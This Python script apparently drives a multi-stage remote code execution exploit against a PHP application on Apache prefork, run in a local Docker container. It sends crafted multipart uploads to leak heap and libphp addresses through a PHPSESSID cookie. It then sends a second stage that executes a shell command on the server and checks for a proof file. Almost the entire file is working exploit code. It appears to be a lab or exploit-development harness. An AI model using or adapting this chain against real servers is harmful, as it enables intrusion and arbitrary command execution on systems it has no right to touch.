import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                 os.pardir, "exploits"))
import socket, struct, sys, threading, time, subprocess
from collections import Counter
from urllib.parse import unquote_to_bytes
import exploit as E, worker, def_rce
HOST="127.0.0.1"; PORT=int(os.environ.get("PORT","8100")); PATH="/index.php"
CRLF=b"\r\n"

def send_req(s, body, boundary, chunked, cap=16<<20):
    if chunked:
        hdr=("POST "+PATH+" HTTP/1.1"+CRLF.decode()+"Host: %s:%d"%(HOST,PORT)+CRLF.decode()+
             "Content-Type: multipart/form-data; boundary="+boundary.decode()+CRLF.decode()+
             "Transfer-Encoding: chunked"+CRLF.decode()+"Connection: close"+CRLF.decode()+CRLF.decode()).encode()
        s.sendall(hdr)
        mv=memoryview(body)
        for off in range(0,len(body),262144):
            piece=mv[off:off+262144]
            s.sendall(("%x"%len(piece)).encode()+CRLF+piece+CRLF)
        s.sendall(b"0"+CRLF+CRLF)
    else:
        hdr=("POST "+PATH+" HTTP/1.1"+CRLF.decode()+"Host: %s:%d"%(HOST,PORT)+CRLF.decode()+
             "Content-Type: multipart/form-data; boundary="+boundary.decode()+CRLF.decode()+
             "Content-Length: %d"%len(body)+CRLF.decode()+"Connection: close"+CRLF.decode()+CRLF.decode()).encode()
        s.sendall(hdr+body)
    out=b""
    try:
        while True:
            c=s.recv(1<<20)
            if not c: break
            out+=c
            if len(out)>cap: break
    except OSError: pass
    s.close(); return out

def run(items):
    res=[None]*len(items)
    def w(i):
        ch,body,bnd = items[i]
        try:
            s=socket.create_connection((HOST,PORT),timeout=120); s.settimeout(120)
            res[i]=send_req(s,body,bnd,ch)
        except Exception as e: res[i]=("ERR",str(e))
    ths=[threading.Thread(target=w,args=(i,)) for i in range(len(items))]
    for t in ths: t.start()
    for t in ths: t.join()
    return res

def parse_leak(raw):
    chunk=0; libphp=0
    cc=Counter(); cd=Counter()
    for k in range(0,len(raw)-8,8):
        v=struct.unpack_from("<Q",raw,k)[0]
        if v<0x1000 or v>=0x800000000000 or v&7: continue
        b=v&~0x1FFFFF
        if v-b<0x200000: cc[b]+=1
        x=v-def_rce.DTOR_OFF
        if x>0 and x&0xfff==0: cd[x]+=1
    if cc: chunk=cc.most_common(1)[0][0]
    if cd: libphp=cd.most_common(1)[0][0]
    return chunk,libphp

CNAME = os.environ.get("C", worker.container_name())
PROOF = os.environ.get("PROOF", os.path.join(worker.out_dir(), "pd"))
CMD = os.environ.get("CMD", "id>/srv/out/pd")
if os.environ.get("MWR", "1") == "1":
    subprocess.run(["docker", "restart", CNAME], check=True, capture_output=True)
    time.sleep(2.2)
subprocess.run(["docker", "exec", CNAME, "sh", "-c",
                "rm -f /tmp/sess_* /srv/out/*"], check=False)
if os.path.exists(PROOF):
    os.unlink(PROOF)
# One A/B pair per prefork child: Apache dispatches each connection to any idle
# child, and only a child that served an A keeps the stale PS() state that a B
# can leak.  All children share the parent's mmap layout, so one leak is enough.
N = int(os.environ.get("MWN", "2"))
if len(sys.argv) > 1:
    N = int(sys.argv[1])
A=def_rce.build_stage1_a()
print("stage1 A fanout",flush=True)
ra=run([(True,A,b"S"*17)]*N)
print("A lens",[len(x) if isinstance(x,bytes) else x for x in ra],flush=True)
time.sleep(0.4)
B=E.build_multipart(def_rce.stage1_b_body(),b"T"*11)
rb=run([(False,B,b"T"*11)]*N)
good=[]
for i,r in enumerate(rb):
    ch=lib=0
    if isinstance(r,bytes) and b"Set-Cookie: PHPSESSID=" in r:
        j=r.find(b"Set-Cookie: PHPSESSID="); k=r.find(CRLF,j)
        raw=unquote_to_bytes(r[j:k].split(b"=",1)[1])[:0x4000]
        ch,lib=parse_leak(raw)
    print("B%d cookie=%s chunk=%s lib=%s"%(i, isinstance(r,bytes) and b"Set-Cookie" in r, hex(ch), hex(lib)),flush=True)
    if ch and lib: good.append((ch,lib))
if not good:
    print("no leak"); sys.exit(1)
CH,LIB=good[0]
time.sleep(0.4)
A3=E.build_multipart(def_rce.stage3_a_body(),b"S"*17)
print("stage3 A fanout",flush=True)
r3=run([(False,A3,b"S"*17)]*N)
print("A3 lens",[len(x) if isinstance(x,bytes) else x for x in r3],flush=True)
time.sleep(0.4)
def_rce.CMD=CMD
bp,htdata,zif=def_rce.stage3_b_body(CH,LIB)
body3=E.build_multipart(bp,b"B"*10)
print("stage3 B fanout",flush=True)
r4=run([(False,body3,b"B"*10) for i in range(N)])
print("B3 lens",[len(x) if isinstance(x,bytes) else x for x in r4],flush=True)
print("R0=%#x htdata=%#x zif=%#x"%(CH+def_rce.R0_OFF,htdata,zif),flush=True)
time.sleep(1.0)
try:
    proof=open(PROOF,"rb").read().decode("latin1").strip()
except OSError:
    proof=""
print("PROOF:",proof,flush=True)
sys.exit(0 if proof else 1)
